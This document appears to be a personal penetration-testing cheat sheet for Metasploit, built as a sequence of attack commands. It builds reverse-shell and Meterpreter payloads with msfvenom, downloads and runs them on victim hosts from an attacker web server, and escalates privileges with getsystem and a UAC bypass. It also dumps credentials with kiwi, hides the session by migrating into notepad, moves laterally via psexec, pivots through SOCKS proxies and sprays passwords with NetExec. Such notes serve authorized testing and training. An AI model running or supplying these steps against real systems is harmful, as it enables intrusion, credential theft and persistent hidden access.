# Metasploit

## Searchsploit

```
searchsploit Apache 2.4.49
searchsploit -m 42341 # mirror
searchsploit -u # update
```

### Adapting exploits

#### Python

PyInstaller: https://pyinstaller.org/en/stable/

#### C

Cross-compiler `wingw-w64`:
```
kali$ sudo apt-get install mingw-w64
kali$ i686-w64-mingw32-gcc searchsploit_number.c -o exploit_for_the_target_machine.exe
kali$ i686-w64-mingw32-gcc searchsploit_number.c - lws2_32 -o exploit_for_the_target_machine.exe # for the winsock.h library
```
Change the listener Ip and Port in the source code.

## Msfconsole

```
$ sudo msfdb init
$ sudo systemctl enable postgresql
$ sudo msfconsole
> db_status
> help
> workspace
> workspace -a newassesment
```

## Auxiliary modules

```
show auxiliary
search type:auxiliary someservice
use somenum
info
show options
set someoption somevalue
unset someoption
service -p someport --rhosts
run
vulns
creds
```

## Exploit modules

```
search someservice
use num
show options
set svar sval
run
run -j
^z
session -l
session -i 1
```

## Payloads

```
show payloads
use payload num
run
shell
^z
channel -i num
```

## Msfvenom `+++`

Cheat sheets:
- https://github.com/frizb/MSF-Venom-Cheatsheet
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

### Staged Nok `<---`
```
$ msfvenom -l payloads --platform windows --arch x64
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=AttackerIP LPORT=AttackerPort -f exe -o nonstaged.exe
$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=AttackerIP LPORT=AttackerPort -f exe -o staged.exe
$ python3 -m http.server 80
$ rdesktop VictimIp -u user -p pass -g num%+offsetX+offsetY
> iwr -uri http://AttackerIp/nonstaged.exe -outfile nonstaged.exe
> iwr -uri http://AttackerIp/staged.exe -outfile staged.exe
> .\nonstaged.exe # Ok 
> .\staged.exe # Nok
```

### Staged Ok & Multi-handler

https://www.rapid7.com/db/modules/exploit/multi/handler/

```
$ msfconsole
> use multi/handler
> set payload windows/x64/shell/reverse_tcp
> show options
> set LHOST AttackerIp
> set LPORT AttackerPort
> run # or `run -j` and `sessions -l` and `sessions -i num`
PS > ./stage.exe # Ok
```

## Meterpreter payload

```
$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=AttIP LPORT=AttPort -f exe -o met.exe
$ python3 -m http.server 80
msf > set payload windows/x64/meterpreter_reverse_https
msf > set LPORT 443 # LHOST set before... /!\
msf > run
$ nc VictimIp 4444
cmd> powershell
PS > iwr -uri http://AttIp/met.exe -outfile met.exe
PS > ./met.exe
meterpreter > idletime
meterpreter > shell
shell > whoami /priv # SeImpersonatePrivilege activated ???
shell > exit
meterpreter > getuid
meterpreter > getsystem
meterpreter > getuid # rights escalated +++
meterpreter > ps # get met.exe PID
meterpreter > migrate somepidtohidthemeterpreter
meterpreter > execute -H -f notepad # Hide the meterpreter in notepad
meterpreter > migrate notepadpid
meterpreter > getenv someenvvar
```

## Post-exploitation

```
PS > ^z # background channel
meterpreter > bg # background session, get number
msf > search uac
msf > search enumeration hosts
msf > use exploit/windows/local/bypassuac_sdclt
msf > use post/windows/gather/enum_hostfile
msf (exploit|post) > show options
msf xxx > set session session_number
msf xxx > run
meterpreter > shell
cmd > powershell -ep bypass
PS > Import-Module NtObjectManager
PS > Get-NtTokenIntegrityLevel
PS > exit # or ^z
meterpreter > load kiwi
meterpreter > help
meterpreter > creds_msv
```

## Pivoting

```
nc cmd > ipconfig
nc cmd > ./met.exe
meterpreter > bg # jot down the session number
msf exploit(multi/handler) > route add $InternalNetwork/24 $session_number
msf exploit(multi/handler) > route print
msf exploit(multi/handler)  > use auxiliary/scanner/portscan/tcp
msf auxiliary(scanner/portscan/tcp) > set rhosts $internalnetwork/24
msf auxiliary(scanner/portscan/tcp) > set ports 445,3389
msf auxiliary(scanner/portscan/tcp) > run
(...)
msf auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set smbuser someuser
msf exploit(windows/smb/psexec) > set smbpass "somepass"
msf exploit(windows/smb/psexec) > set rhosts $internalhost
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
msf exploit(windows/smb/psexec) > set lport 8000
msf exploit(windows/smb/psexec) > run
meterpreter > whoami /priv
meterpreter > exit
msf exploit(windows/smb/psexec) > route flush
msf exploit(windows/smb/psexec) > route print
msf exploit(windows/smb/psexec) > use multi/manage/autoroute
msf post(multi/manage/autoroute) > show options
msf post(multi/manage/autoroute) > sessions -l
msf post(multi/manage/autoroute) > set session $session_number
msf post(multi/manage/autoroute) > run
msf post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > show options
msf auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
msf auxiliary(server/socks_proxy) > set version 5
msf auxiliary(server/socks_proxy) > run -j
$ sudo vi /etc/proxychains4.conf # Add `socks5 127.0.0.1 1080`
$ sudo proxychains xfreerdp /v:$TargetIP /u:someuser
msf auxiliary(server/socks_proxy) > sessions -i some_other_session_number
meterpreter > portfwd -h
meterpreter > portfwd add -l 3389 -p 3389 -r $TargetIP
$ xfreerdp /v:$TargetIP /u:luiza
```

## Automation scripts

```
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set lhost $AttackerIP
set lport $AttackerPort

set AutoRunScript post/windows/manage/migrate

set ExitOnSession false

run -z -j

$ sudo msfconsole -r mymsfscript.rc
PS > .\met.exe
```

## Tunneling

On Kali, build a Meterpreter payload:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$AttIP LPORT=$AttPort -f exe -o met.exe
```
and download it on the DMZ target:
```
PS > iwr -uri http://$IpAttacker/met.exe -outfile met.exe
```

Trigger a reverse shell in a multi-handler:
```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $IpAttacker
set LPORT 443 # or 4444
set ExitOnSession false
run -j
```

In the remote shell, execute the Meterpreter:
```
PS > .\met.exe
```

then configure the routing:
```
use multi/manage/autoroute
set session 1
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

check the proxy config (default port is `1080`):
```
$ cat /etc/proxychains4.conf
```

and enumerate:
```
sudo proxychains -q nmap -vvv -sT -n -Pn -T4 -p 22,139,445 a.b.c.d1-d2
proxychains -q NetExec smb $IP -u xx -p 'yy' -d someorg.com --shares
proxychains -q NetExec smb ./targets.txt -u ./users.txt -p ./passwords.txt -d someorg.com --shares
proxychains -q evil-winrm -i $IP -u xx -p 'yy'
```
